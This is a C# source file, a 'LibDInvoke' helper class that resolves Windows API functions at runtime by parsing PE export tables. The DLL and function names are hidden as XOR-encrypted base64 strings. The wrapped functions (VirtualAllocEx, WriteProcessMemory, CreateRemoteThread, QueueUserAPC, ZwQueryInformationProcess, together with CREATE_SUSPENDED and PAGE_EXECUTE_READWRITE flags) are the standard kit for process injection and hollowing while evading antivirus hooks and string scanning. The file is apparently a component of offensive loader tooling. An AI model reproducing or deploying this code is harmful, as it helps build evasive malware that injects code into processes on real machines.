using System;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;


namespace LibDInvoke
{
    internal class DInvoke
    {
        [Flags]
        public enum AllocationFlags : uint
        {
            MEM_COMMIT = 0x00001000,
            MEM_RESERVE = 0x00002000
        }

        [Flags]
        public enum MemoryProtectionFlags : uint
        {
            PAGE_NO_ACCESS = 0x01,
            PAGE_EXECUTE_READWRITE = 0x40
        }

        [Flags]
        public enum ProcessCreationFlags : uint
        {
            ZERO_FLAG = 0x00000000,
            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
            CREATE_NEW_CONSOLE = 0x00000010,
            CREATE_NEW_PROCESS_GROUP = 0x00000200,
            CREATE_NO_WINDOW = 0x08000000,
            CREATE_PROTECTED_PROCESS = 0x00040000,
            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
            CREATE_SEPARATE_WOW_VDM = 0x00001000,
            CREATE_SHARED_WOW_VDM = 0x00001000,
            CREATE_SUSPENDED = 0x00000004,
            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
            DEBUG_PROCESS = 0x00000001,
            DETACHED_PROCESS = 0x00000008,
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
            INHERIT_PARENT_AFFINITY = 0x00010000
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr ExitStatus;
            public IntPtr PebBaseAddress;
            public UIntPtr AffinityMask;
            public int BasePriority;
            public UIntPtr UniqueProcessId;
            public UIntPtr InheritedFromUniqueProcessId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref int lpThreadId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate IntPtr GetCurrentProcess();

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate IntPtr LoadLibrary(string lpLibFileName);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate IntPtr OpenProcess(UInt32 dwDesiredAccess, bool bInheritHandle, UInt32 dwProcessId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesRead);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate uint ResumeThread(IntPtr hThread);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, UInt32 flAllocationType, UInt32 flProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, int dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out int lpNumberOfBytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate UInt32 ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, UInt32 ProcInfoLen, ref UInt32 retlen);

        private static string Unveil(string b64)
        {
            byte[] key = {
                0xb3, 0x16, 0x2b, 0xd6, 0x74, 0x12, 0x20, 0xe2, 0x48, 0xd6, 0xae, 0x32,
                0xc2, 0xf7, 0x9f, 0x26, 0x60, 0x81, 0x19, 0x8a, 0xb3, 0xa9, 0x8f, 0xbe,
                0x6d, 0x48, 0x2c, 0x1f, 0x7b, 0x2c, 0x0f, 0xca
            };

            byte[] data = Convert.FromBase64String(b64);

            for (int i = 0; i < data.Length; ++i)
                data[i] ^= key[i % key.Length];

            return Encoding.Default.GetString(data);
        }

        private static IntPtr GetLoadedModuleAddress(string dllName)
        {
            foreach (ProcessModule Mod in Process.GetCurrentProcess().Modules)
            {
                if (Mod.FileName.ToLower().EndsWith(dllName.ToLower()))
                    return Mod.BaseAddress;
            }

            return IntPtr.Zero;
        }

        private static IntPtr GetExportAddress(IntPtr moduleBase, string exportName)
        {
            IntPtr functionPtr = IntPtr.Zero;

            try
            {
                // Traverse the PE header in memory
                Int32 PeHeader = Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + 0x3C));
                Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(moduleBase.ToInt64() + PeHeader + 0x14));
                Int64 OptHeader = moduleBase.ToInt64() + PeHeader + 0x18;
                Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
                Int64 pExport = 0;

                if (Magic == 0x010b)
                    pExport = OptHeader + 0x60;
                else
                    pExport = OptHeader + 0x70;

                // Read -> IMAGE_EXPORT_DIRECTORY
                Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
                Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + ExportRVA + 0x10));
                Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + ExportRVA + 0x14));
                Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + ExportRVA + 0x18));
                Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + ExportRVA + 0x1C));
                Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + ExportRVA + 0x20));
                Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + ExportRVA + 0x24));

                // Loop the array of export name RVA's
                for (int i = 0; i < NumberOfNames; i++)
                {
                    string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(moduleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + NamesRVA + i * 4))));
                    if (FunctionName.Equals(exportName, StringComparison.OrdinalIgnoreCase))
                    {
                        Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(moduleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                        Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                        functionPtr = (IntPtr)((Int64)moduleBase + FunctionRVA);

                        break;
                    }
                }
            }
            catch
            {
                // Catch parser failure
                throw new InvalidOperationException("Failed to parse module exports");
            }

            if (functionPtr == IntPtr.Zero)
            {
                // Export not found
                throw new MissingMethodException(exportName + " export not found");
            }
            return functionPtr;
        }

        private static IntPtr GetLibraryAddress(string DLLName, string FunctionName)
        {
            IntPtr hModule = GetLoadedModuleAddress(DLLName);

            if (hModule == IntPtr.Zero)
                throw new DllNotFoundException(DLLName + " DLL not found");

            return GetExportAddress(hModule, FunctionName);
        }

        /*
            Dynamic calls
        */
        internal static bool fCreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation)
        {
            // IntPtr ptr = GetLibraryAddress("kernel32.dll", "CreateProcessA");
            IntPtr ptr = GetLibraryAddress(Unveil("2HNZuBF+E9BmssJe"), Unveil("8GROtwB3cJAntctBsbY="));
            CreateProcess fnc = (CreateProcess)Marshal.GetDelegateForFunctionPointer(ptr, typeof(CreateProcess));

            return fnc(lpApplicationName, lpCommandLine, ref lpProcessAttributes, ref lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, ref lpStartupInfo, out lpProcessInformation);
        }

        internal static IntPtr fCreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref int lpThreadId)
        {
            // IntPtr ptr = GetLibraryAddress("kernel32.dll", "CreateRemoteThread");
            IntPtr ptr = GetLibraryAddress(Unveil("2HNZuBF+E9BmssJe"), Unveil("8GROtwB3cocludpXlp/tQwHl"));
            CreateRemoteThread fnc = (CreateRemoteThread)Marshal.GetDelegateForFunctionPointer(ptr, typeof(CreateRemoteThread));

            return fnc(hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, param, dwCreationFlags, ref lpThreadId);
        }

        internal static IntPtr fGetCurrentProcess()
        {
            // IntPtr ptr = GetLibraryAddress("kernel32.dll", "GetCurrentProcess");
            IntPtr ptr = GetLibraryAddress(Unveil("2HNZuBF+E9BmssJe"), Unveil("9HNflQFgUocmov5ArZT6VRM="));
            GetCurrentProcess fnc = (GetCurrentProcess)Marshal.GetDelegateForFunctionPointer(ptr, typeof(GetCurrentProcess));

            return fnc();
        }

        internal static IntPtr fGetProcAddress(string DLLName, string FunctionName)
        {
            // IntPtr ptr = GetLibraryAddress("kernel32.dll", "GetProcAddress");
            IntPtr ptr = GetLibraryAddress(Unveil("2HNZuBF+E9BmssJe"), Unveil("9HNfhgZ9Q6MsstxXsYQ="));
            GetProcAddress fnc = (GetProcAddress)Marshal.GetDelegateForFunctionPointer(ptr, typeof(GetProcAddress));

            return fnc(fLoadLibrary(DLLName), FunctionName);
        }

        internal static IntPtr fLoadLibrary(string DLLName)
        {
            // IntPtr ptr = GetLibraryAddress("kernel32.dll", "LoadLibraryA");
            IntPtr ptr = GetLibraryAddress(Unveil("2HNZuBF+E9BmssJe"), Unveil("/3lKsjh7QpAppNdz"));
            LoadLibrary fnc = (LoadLibrary)Marshal.GetDelegateForFunctionPointer(ptr, typeof(LoadLibrary));

            return fnc(DLLName);
        }

        internal static IntPtr fOpenProcess(UInt32 dwDesiredAccess, bool bInheritHandle, UInt32 dwProcessId)
        {
            // IntPtr ptr = GetLibraryAddress("kernel32.dll", "OpenProcess");
            IntPtr ptr = GetLibraryAddress(Unveil("2HNZuBF+E9BmssJe"), Unveil("/GZOuCRgT4Etpd0="));
            OpenProcess fnc = (OpenProcess)Marshal.GetDelegateForFunctionPointer(ptr, typeof(OpenProcess));

            return fnc(dwDesiredAccess, bInheritHandle, dwProcessId);
        }

        internal static IntPtr fQueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData)
        {
            // IntPtr ptr = GetLibraryAddress("kernel32.dll", "QueueUserAPC");
            IntPtr ptr = GetLibraryAddress(Unveil("2HNZuBF+E9BmssJe"), Unveil("4mNOoxFHU4c6l/5x"));
            QueueUserAPC fnc = (QueueUserAPC)Marshal.GetDelegateForFunctionPointer(ptr, typeof(QueueUserAPC));

            return fnc(pfnAPC, hThread, dwData);
        }

        internal static bool fReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesRead)
        {
            // IntPtr ptr = GetLibraryAddress("kernel32.dll", "ReadProcessMemory");
            IntPtr ptr = GetLibraryAddress(Unveil("2HNZuBF+E9BmssJe"), Unveil("4XNKsiRgT4Etpd1/p5rwVBk="));
            ReadProcessMemory fnc = (ReadProcessMemory)Marshal.GetDelegateForFunctionPointer(ptr, typeof(ReadProcessMemory));

            return fnc(hProcess, lpBaseAddress, lpBuffer, nSize, out lpNumberOfBytesRead);
        }

        internal static uint fResumeThread(IntPtr hThread)
        {
            // IntPtr ptr = GetLibraryAddress("kernel32.dll", "ResumeThread");
            IntPtr ptr = GetLibraryAddress(Unveil("2HNZuBF+E9BmssJe"), Unveil("4XNYoxl3dIo6s89W"));
            ResumeThread fnc = (ResumeThread)Marshal.GetDelegateForFunctionPointer(ptr, typeof(ResumeThread));

            return fnc(hThread);
        }

        internal static IntPtr fVirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, UInt32 flAllocationType, UInt32 flProtect)
        {
            // IntPtr ptr = GetLibraryAddress("kernel32.dll", "VirtualAllocEx");
            IntPtr ptr = GetLibraryAddress(Unveil("2HNZuBF+E9BmssJe"), Unveil("5X9ZogFzTKMkusFRh48="));
            VirtualAllocEx fnc = (VirtualAllocEx)Marshal.GetDelegateForFunctionPointer(ptr, typeof(VirtualAllocEx));

            return fnc(hProcess, lpAddress, dwSize, flAllocationType, flProtect);
        }

        internal static IntPtr fVirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, int dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred)
        {
            // IntPtr ptr = GetLibraryAddress("kernel32.dll", "VirtualAllocExNuma");
            IntPtr ptr = GetLibraryAddress(Unveil("2HNZuBF+E9BmssJe"), Unveil("5X9ZogFzTKMkusFRh4/RUw3g"));
            VirtualAllocExNuma fnc = (VirtualAllocExNuma)Marshal.GetDelegateForFunctionPointer(ptr, typeof(VirtualAllocExNuma));

            return fnc(hProcess, lpAddress, dwSize, flAllocationType, flProtect, nndPreferred);
        }

        internal static bool fVirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect)
        {
            // IntPtr ptr = GetLibraryAddress("kernel32.dll", "VirtualProtect");
            IntPtr ptr = GetLibraryAddress(Unveil("2HNZuBF+E9BmssJe"), Unveil("5X9ZogFzTLI6udpXoYM="));
            VirtualProtect fnc = (VirtualProtect)Marshal.GetDelegateForFunctionPointer(ptr, typeof(VirtualProtect));

            return fnc(lpAddress, dwSize, flNewProtect, out lpflOldProtect);
        }

        internal static bool fWriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out int lpNumberOfBytesWritten)
        {
            // IntPtr ptr = GetLibraryAddress("kernel32.dll", "WriteProcessMemory");
            IntPtr ptr = GetLibraryAddress(Unveil("2HNZuBF+E9BmssJe"), Unveil("5GRCohFCUo0rs91Bj5LySRL4"));
            WriteProcessMemory fnc = (WriteProcessMemory)Marshal.GetDelegateForFunctionPointer(ptr, typeof(WriteProcessMemory));

            return fnc(hProcess, lpBaseAddress, lpBuffer, nSize, out lpNumberOfBytesWritten);
        }

        internal static UInt32 fZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, UInt32 ProcInfoLen, ref UInt32 retlen)
        {
            // IntPtr ptr = GetLibraryAddress("ntdll.dll", "ZwQueryInformationProcess");
            IntPtr ptr = GetLibraryAddress(Unveil("3WJPuhg8RI4k"), Unveil("6WF6oxFgWasmsMFAr5brTw/vSfjcyurNHg=="));
            ZwQueryInformationProcess fnc = (ZwQueryInformationProcess)Marshal.GetDelegateForFunctionPointer(ptr, typeof(ZwQueryInformationProcess));

            return fnc(hProcess, procInformationClass, ref procInformation, ProcInfoLen, ref retlen);
        }
    }
}
